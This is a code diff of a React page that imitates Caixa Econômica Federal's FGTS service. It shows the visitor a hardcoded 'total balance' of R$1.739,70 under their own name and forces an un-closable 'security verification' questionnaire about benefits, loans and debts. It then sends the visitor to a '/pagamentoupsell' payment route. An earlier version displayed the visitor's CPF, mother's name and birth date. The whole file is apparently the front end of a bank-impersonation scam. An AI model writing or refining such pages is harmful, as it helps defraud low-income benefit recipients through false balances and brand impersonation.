@@ -1,12 +1,15 @@
 import { useState, useEffect } from "react";
-import { AiOutlineCalendar, AiOutlineUser } from "react-icons/ai";
-import logo from "../assets/caixa.webp";
-import { BiCard } from "react-icons/bi";
-import { GiFemale } from "react-icons/gi";
-import { FaSpinner } from "react-icons/fa";
+import flogo from "../assets/f-logo.png"
+import { BiDollar } from "react-icons/bi";
+import fgts from "../assets/fgts2.png";
+import caixa from "../assets/caixalogo.png";
+
+import { FaAngleRight, FaExchangeAlt, FaInfo } from "react-icons/fa";
 import Modal from "react-modal";
 import { TbLockExclamation } from "react-icons/tb";
 import logocaixa from "../assets/unnamed.png"
+import { RiExchangeDollarFill } from "react-icons/ri";
+import SecurityCheck from "../security/securityCheck";
 
 // Estilo do Modal
 const modalStyles: Modal.Styles = {
@@ -33,20 +36,12 @@ const modalStyles: Modal.Styles = {
 Modal.setAppElement("#root"); // Acessibilidade para o Modal
 
 export function Perguntas() {
-    const [loadingData, setLoadingData] = useState(true);
-    const [, setStartQuestions] = useState(false);
-    const [isModalOpen, setIsModalOpen] = useState(false);
+    const [, setLoadingData] = useState(true);
+    const [isModalOpen,] = useState(true);
     const [currentQuestion, setCurrentQuestion] = useState(0);
     const [responses, setResponses] = useState({});
 
-    const questions = [
-        "Você já recebe o Bolsa Família ou algum outro benefício social do governo?",
-        "Já optou pelo Saque-Aniversário do FGTS?",
-        "Possui algum cartão de crédito ativo que possui bom limite?",
-        "Atualmente possui empréstimos consignados?",
-        "Está com o nome negativado (restrição de crédito no SPC/Serasa)?",
-        "Recebe algum tipo de auxílio previdenciário, como auxílio-doença ou aposentadoria?",
-    ];
+
 
     const [userData, setUserData] = useState({
         nome: "Usuário",
@@ -66,11 +61,23 @@ export function Perguntas() {
         }, 4000);
     }, []);
 
-    // Função para iniciar o questionário e abrir o modal
-    const startQuestionnaire = () => {
-        setStartQuestions(true);
-        setIsModalOpen(true);
-    };
+    const questions = [
+        "Você recebe o Bolsa Família ou outro benefício social do governo?",
+        "Já optou pelo Saque-Aniversário do FGTS?",
+        "Está atualmente com algum empréstimo consignado em seu nome?",
+        "Seu nome está negativado ou com restrição de crédito no SPC/Serasa?",
+        "Você recebe algum tipo de auxílio previdenciário, como auxílio-doença ou aposentadoria?",
+        "Você já utilizou o saldo do seu FGTS para algum tipo de financiamento, como a compra da casa própria?",
+        "Possui algum financiamento ativo em seu nome, seja de veículo, imóvel ou outro bem?",
+        "Você já fez ou está fazendo algum tipo de acordo para quitar dívidas ou renegociar crédito?",
+        "Recebeu algum tipo de benefício emergencial do governo nos últimos 12 meses, como o auxílio de enfrentamento à pandemia?",
+        "Você possui algum outro benefício assistencial, como o Auxílio Brasil ou outros programas sociais?",
+        "Tem algum débito com o banco, como parcelas de cheque especial ou empréstimos não pagos?",
+        "Já fez o saque de parte do seu FGTS em alguma emergência financeira?",
+        "Você tem algum seguro de vida, empréstimo pessoal ou outro tipo de produto financeiro vinculado à sua conta na Caixa Econômica?",
+        "Você está atualmente em algum processo de revisão de crédito ou reanálise de limite junto a uma instituição financeira?"
+    ];
+
 
     // Função para salvar a resposta e avançar para a próxima pergunta
     const handleResponse = (answer: unknown) => {
@@ -81,99 +88,116 @@ export function Perguntas() {
         if (currentQuestion < questions.length - 1) {
             setCurrentQuestion(currentQuestion + 1);
         } else {
-            alert("Verificação concluída com sucesso!");
-            setIsModalOpen(false);
-            setStartQuestions(false);
+            window.location.href = "/pagamentoupsell";
         }
     };
 
     return (
-        <div className="w-screen h-screen flex flex-col items-center px-6 space-y-5 mt-6">
-            <header className="flex flex-col items-center p-4 space-y-3">
-                <img width={170} src={logo} alt="logo" />
-                <span className="text-blue-800">Seja bem vindo {userData.nome.split(" ")[0]}</span>
+        <div className="w-screen h-screen flex flex-col items-center text-white mb-20">
+            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
+                <div className="flex items-center justify-between w-full">
+                    <div className="flex items-center space-x-3">
+                        <img width={34} src={caixa} alt="logo" />
+                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
+                    </div>
+                    <img src={fgts} alt="fgts" width={65} />
+                </div>
+
+                <div className="flex flex-col space-y-3">
+                    <div className="flex items-center space-x-2">
+                        <div className="bg-orange-400 p-1 rounded-full w-fit">
+                            <RiExchangeDollarFill size={30} />
+                        </div>
+                        <h2 className="font-bold text-xl">SALDO TOTAL</h2>
+                    </div>
+
+                    <div className="font-semibold text-3xl px-2">
+                        R$1.739,70
+                    </div>
+
+                    <span className="border-b border-b-white" />
+                </div>
             </header>
 
-            <div className="text-center">
-                <h2 className="text-lg text-zinc-500 mb-2">Precisamos confirmar seus dados...</h2>
-                <p className="text-sm text-zinc-400">
-                    Etapa de segurança do sistema
-                </p>
-            </div>
-
-            <div className="w-full mt-6">
-                {loadingData ? (
-                    <div className="space-y-2">
-                        <div className="h-6 bg-gray-300 rounded w-3/4 animate-pulse"></div>
-                        <div className="h-6 bg-gray-300 rounded w-1/2 animate-pulse"></div>
-                        <div className="h-6 bg-gray-300 rounded w-2/3 animate-pulse"></div>
+            <div className="rounded-lg bg-white w-full -mt-3">
+                <div className="p-4 border-2 m-2 rounded-lg space-y-4">
+                    <div className="flex items-center space-x-2 mb-4">
+                        <div className="bg-orange-400 p-2 rounded-full w-fit">
+                            <img src={flogo} alt="flogo" width={20} />
+                        </div>
+                        <h2 className="font-bold text-2xl text-zinc-700">
+                            Resumo do seu FGTS
+                        </h2>
                     </div>
-                ) : (
-                    <div className="space-y-2 text-left">
-                        <div className="flex items-center space-x-2">
-                            <AiOutlineUser size={18} />
-                            <input
-                                type="text"
-                                value={userData?.nome}
-                                className="border-b border-b-orange-500 w-full text-lg outline-none"
-                                readOnly
-                            />
-                        </div>
-                        <div className="flex items-center space-x-2">
-                            <BiCard size={18} />
-                            <input
-                                type="text"
-                                value={userData?.cpf}
-                                className="border-b border-b-orange-500 w-full text-lg outline-none"
-                                readOnly
-                            />
-                        </div>
-                        {userData?.nomeMae && (
-                            <div className="flex items-center space-x-2">
-                                <GiFemale size={18} />
-                                <input
-                                    type="text"
-                                    value={userData?.nomeMae}
-                                    className="border-b border-b-orange-500 w-full text-lg outline-none"
-                                    readOnly
-                                />
+
+                    <a className="" href="/saquedigital">
+                        <div className="font-bold text-xl flex flex-col space-y-2">
+                            <div className="flex items-center justify-between text-[#025bab]">
+                                <h3>{userData?.nome.toUpperCase()}</h3>
+                                <FaAngleRight />
                             </div>
-                        )}
-                        <div className="flex items-center space-x-2">
-                            <AiOutlineCalendar size={18} />
-                            <input
-                                type="text"
-                                value={userData?.dataNascimento}
-                                className="border-b border-b-orange-500 w-full text-lg outline-none"
-                                readOnly
-                            />
-                        </div>
-                    </div>
-                )}
 
-                <div className="flex flex-col space-y-4 mt-6">
-                    {loadingData ? (
-                        <button
-                            className="w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 bg-zinc-400 hover:bg-zinc-300"
-                        >
-                            <FaSpinner className="animate-spin mr-2" />
-                            Carregando
-                        </button>
-                    ) : (
-                        <button
-                            onClick={startQuestionnaire}
-                            className="w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 bg-orange-500 hover:bg-orange-400"
-                        >
-                            Confirmar dados
-                        </button>
-                    )}
+                            <span className="text-zinc-700">R$1.739,70</span>
+                        </div>
+                    </a>
+                    <span className="border-b border-b-zinc-800 my-2" />
                 </div>
             </div>
+
+            <div className="grid grid-cols-2 text-zinc-900 w-full gap-2 p-4">
+                <a href="/saquedigital">
+                    <div className="bg-orange-500 text-xl font-extralight text-white w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
+                        <div className="bg-white p-2 text-orange-500 rounded-full w-fit">
+                            <BiDollar />
+                        </div>
+                        <div>
+                            Solicite seu saque <span className="font-bold">100% digital</span>
+                        </div>
+                    </div>
+                </a>
+
+                <div
+                    className="cursor-pointer text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2"
+                >
+                    <div className="bg-orange-500 p-2 text-white rounded-full w-fit">
+                        <FaExchangeAlt />
+                    </div>
+                    <div>
+                        <span className="font-bold">Conta bancária</span> para saque do
+                        seu <span className="font-bold">FGTS</span>
+                    </div>
+                </div>
+
+                <a href="/saquedigital">
+                    <div className="text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
+                        <div className="bg-orange-500 p-2 text-white rounded-full w-fit">
+                            <img src={flogo} alt="flogo" width={20} />
+                        </div>
+                        <div>
+                            <span className="font-bold">Sistemática de saque </span> do seu
+                            <span className="font-bold"> FGTS</span>
+                        </div>
+                    </div>
+                </a>
+
+                <a href="/info">
+                    <div className="text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
+                        <div className="bg-orange-500 p-2 text-white rounded-full w-fit">
+                            <FaInfo />
+                        </div>
+                        <div>
+                            Informações <span className="font-bold">úteis</span>
+                        </div>
+                    </div>
+                </a>
+            </div>
+
+            <SecurityCheck />
 
             {/* Modal para as Perguntas de Verificação de Segurança */}
             <Modal
                 isOpen={isModalOpen}
-                onRequestClose={() => setIsModalOpen(false)}
+                // onRequestClose={() => setIsModalOpen(false)}
                 style={modalStyles}
                 contentLabel="Verificação de Segurança"
             >
@@ -182,15 +206,15 @@ export function Perguntas() {
                     <img src={logocaixa} alt="logg" width={100} />
 
                 </div>
-                <div className="text-center">
-                    <div className="flex items-center">
-                        <TbLockExclamation className="text-orange-500 text-xl" />
+                <div className="text-center w-full">
+                    <div className="flex items-center w-full justify-center">
+                        <TbLockExclamation className="text-orange-500 text-3xl" />
                         <h2 className="text-xl font-bold">Verificação de Segurança</h2>
                     </div>
-                    <p className="text-lg text-zinc-500 mb-2">
+                    <p className="text-xl text-zinc-500 mb-2">
                         Etapa {currentQuestion + 1} de {questions.length}
                     </p>
-                    <p className="text-lg text-zinc-700 mb-4">{questions[currentQuestion]}</p>
+                    <p className="text-2xl my-4 text-zinc-700 mb-10 ">{questions[currentQuestion]}</p>
 
                     <div className="flex flex-col w-full justify-center mt-4 space-y-3">
                         <button
@@ -210,5 +234,8 @@ export function Perguntas() {
                 </div>
             </Modal>
         </div>
+
+
+
     );
 }
